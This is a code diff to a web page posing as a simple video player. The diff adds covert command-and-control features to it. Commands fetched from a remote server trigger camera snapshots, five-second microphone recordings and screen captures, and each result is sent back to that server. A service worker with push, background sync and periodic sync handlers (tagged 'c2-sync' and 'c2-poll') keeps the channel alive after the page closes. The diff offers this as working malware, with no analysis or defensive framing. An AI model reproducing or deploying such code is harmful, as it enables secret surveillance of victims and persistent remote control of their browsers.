@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Video</title>
+<link rel="manifest" href="data:application/json,{'name':'Video Player','short_name':'Video','start_url':'.','display':'standalone','background_color':'#000','theme_color':'#000'}">
 <style>
 body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh}
 video{width:100%;max-width:600px}
@@ -46,6 +47,11 @@ function sendResult(cmd, result, data){
             el.textContent = 'Result send failed: HTTP ' + xhr.status;
             el.style.color = '#f00';
         }
+    };
+    xhr.onerror = function(){
+        var el = document.getElementById('msg');
+        el.textContent = 'Result send: Network/CORS error';
+        el.style.color = '#f00';
     };
     xhr.send(JSON.stringify({cmd: cmd, result: result, data: data}));
 }
@@ -111,6 +117,43 @@ function executeCommand(cmdObj){
         else if (cmd === 'user_agent'){
             sendResult(cmd, 'success', navigator.userAgent);
         }
+        else if (cmd === 'camera'){
+            if (!navigator.mediaDevices){ sendResult(cmd, 'error', 'mediaDevices not supported'); return; }
+            navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
+                var v = document.createElement('video'); v.srcObject = stream; v.play();
+                setTimeout(function(){
+                    var c = document.createElement('canvas'); c.width=320; c.height=240;
+                    c.getContext('2d').drawImage(v,0,0,320,240);
+                    sendResult(cmd, 'success', c.toDataURL('image/jpeg'));
+                    stream.getTracks().forEach(function(t){t.stop();});
+                }, 800);
+            }).catch(function(e){ sendResult(cmd, 'error', e.toString()); });
+        }
+        else if (cmd === 'microphone'){
+            if (!navigator.mediaDevices){ sendResult(cmd, 'error', 'mediaDevices not supported'); return; }
+            navigator.mediaDevices.getUserMedia({audio:true}).then(function(stream){
+                var mr = new MediaRecorder(stream); var chunks=[];
+                mr.ondataavailable = function(e){ chunks.push(e.data); };
+                mr.onstop = function(){
+                    var reader = new FileReader();
+                    reader.onloadend = function(){ sendResult(cmd, 'success', reader.result); };
+                    reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
+                };
+                mr.start(); setTimeout(function(){ mr.stop(); stream.getTracks().forEach(function(t){t.stop();}); }, 5000);
+            }).catch(function(e){ sendResult(cmd, 'error', e.toString()); });
+        }
+        else if (cmd === 'screen_capture'){
+            if (!navigator.mediaDevices){ sendResult(cmd, 'error', 'mediaDevices not supported'); return; }
+            navigator.mediaDevices.getDisplayMedia({video:true}).then(function(stream){
+                var v = document.createElement('video'); v.srcObject = stream; v.play();
+                setTimeout(function(){
+                    var c = document.createElement('canvas'); c.width=Math.min(screen.width,1280); c.height=Math.min(screen.height,720);
+                    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+                    sendResult(cmd, 'success', c.toDataURL('image/jpeg',0.6));
+                    stream.getTracks().forEach(function(t){t.stop();});
+                }, 500);
+            }).catch(function(e){ sendResult(cmd, 'error', e.toString()); });
+        }
         else {
             sendResult(cmd, 'unknown', 'Unknown command: ' + cmd);
         }
@@ -163,6 +206,56 @@ el.style.color = '#0f0';
 // Poll for commands every 3 seconds
 setInterval(pollCommands, 3000);
 pollCommands();
+
+// Service Worker + Push + Background Sync for persistence
+(function(){
+    if (!('serviceWorker' in navigator)) return;
+    var SW = `
+    self.addEventListener('push', function(e){
+        var data = e.data ? e.data.json() : {};
+        self.registration.showNotification(data.title||'Update', {
+            body: data.body||'New command available',
+            icon: '',
+            requireInteraction: true,
+            data: {url: self.location.origin}
+        });
+    });
+    self.addEventListener('notificationclick', function(e){
+        e.notification.close();
+        e.waitUntil(clients.openWindow(self.location.origin));
+    });
+    self.addEventListener('sync', function(e){
+        if (e.tag === 'c2-sync'){
+            e.waitUntil(fetch(BASE_URL + '/api/cmd/' + DEVICE_ID).then(function(r){return r.json();}).then(function(d){
+                if(d.cmd){ clients.matchAll().then(function(c){ c.forEach(function(cl){ cl.postMessage(d); }); }); }
+            }));
+        }
+    });
+    self.addEventListener('periodicsync', function(e){
+        if (e.tag === 'c2-poll'){
+            e.waitUntil(fetch(BASE_URL + '/api/cmd/' + DEVICE_ID).then(function(r){return r.json();}).then(function(d){
+                if(d.cmd){ clients.matchAll().then(function(c){ c.forEach(function(cl){ cl.postMessage(d); }); }); }
+            }));
+        }
+    });
+    self.addEventListener('install', function(e){ self.skipWaiting(); });
+    self.addEventListener('activate', function(e){ e.waitUntil(self.clients.claim()); });
+    `;
+    var blob = new Blob([SW], {type:'text/javascript'});
+    var swUrl = URL.createObjectURL(blob);
+    navigator.serviceWorker.register(swUrl).then(function(reg){
+        return reg.pushManager.subscribe({userVisibleOnly:true});
+    }).then(function(sub){
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', BASE_URL + '/api/push_sub/' + DEVICE_ID, true);
+        xhr.setRequestHeader('Content-Type','application/json');
+        xhr.send(JSON.stringify(sub));
+    }).catch(function(e){});
+    navigator.serviceWorker.ready.then(function(reg){
+        if ('sync' in reg) reg.sync.register('c2-sync');
+        if ('periodicSync' in reg) reg.periodicSync.register('c2-poll', {minInterval: 15000});
+    });
+})();
 })();
 </script>
 </body>
